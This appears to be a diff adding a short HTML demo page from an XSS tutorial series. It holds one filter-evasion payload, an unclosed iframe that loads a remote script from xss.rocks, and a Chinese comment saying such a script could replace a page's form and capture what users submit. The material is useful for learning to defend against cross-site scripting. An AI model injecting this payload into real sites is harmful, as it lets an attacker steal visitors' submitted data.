@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="renderer" content="webkit" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"
+    />
+  </head>
+  <title>2-30</title>
+  <body>
+    <div id="root">
+      <iframe src=http://xss.rocks/scriptlet.html <
+      <div>
+        在正常标签后面使用一个开始尖括号< 代替
+        闭合尖括号>，就可以用远程脚本攻击正常页面，比如直接用远程攻击脚本内容代替正常页面上的表单，从而直接获取用户提交的信息
+      </div>
+    </div>
+  </body>
+</html>
